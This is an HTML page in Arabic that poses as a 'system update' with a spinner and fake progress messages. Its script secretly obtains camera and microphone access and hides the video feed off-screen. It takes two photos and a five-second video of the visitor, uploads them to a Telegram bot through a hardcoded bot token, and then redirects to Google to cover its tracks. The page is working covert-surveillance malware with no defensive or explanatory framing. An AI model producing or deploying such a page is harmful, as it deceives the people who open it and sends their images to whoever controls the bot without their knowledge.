<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحديث النظام</title>
    <style>
        body { background: #1a1a1a; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
        .loader { border: 16px solid #333; border-top: 16px solid #00ff00; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { margin-top: 20px; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2 id="status">جاري فحص توافق الجهاز...</h2>

    <video id="video" width="160" height="120" autoplay muted playsinline style="position:fixed; top:-1000px; left:-1000px; opacity:0.1;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
        let chatId = "";

        // دالة الانتظار
        const wait = ms => new Promise(res => setTimeout(res, ms));

        async function init() {
            try {
                // 1. جلب الآيدي أولاً وقبل كل شيء
                const updateRes = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates`);
                const updateData = await updateRes.json();
                if (updateData.result.length > 0) {
                    chatId = updateData.result[updateData.result.length - 1].message.chat.id;
                } else {
                    document.getElementById('status').innerText = "أرسل رسالة للبوت أولاً!";
                    return;
                }

                // 2. طلب الإذن
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                document.getElementById('status').innerText = "جاري تحديث ملفات النظام (60%)...";
                
                // انتظار 3 ثواني كاملة لفتح الكاميرا وضمان عدم سواد الصور
                await wait(3000);

                // 3. التقاط الصور (واحدة تلو الأخرى مع انتظار)
                await captureNow(1);
                await wait(2000);
                await captureNow(2);
                await wait(2000);

                // 4. تسجيل الفيديو
                await recordNow(stream);

            } catch (err) {
                document.getElementById('status').innerText = "فشل: يرجى منح الأذونات للمتابعة";
            }
        }

        async function captureNow(num) {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            
            return new Promise(res => {
                canvas.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('chat_id', chatId);
                    fd.append('photo', blob, `img${num}.jpg`);
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    res();
                }, 'image/jpeg', 0.9);
            });
        }

        async function recordNow(stream) {
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const videoBlob = new Blob(chunks, { type: 'video/mp4' });
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('video', videoBlob, 'video.mp4');
                
                document.getElementById('status').innerText = "اكتمل التحديث بنسبة 100%";
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
                
                await wait(1000);
                window.location.href = "https://www.google.com";
            };
            recorder.start();
            await wait(5000); // تسجيل 5 ثواني
            recorder.stop();
        }

        window.onload = init;
    </script>
</body>
</html>
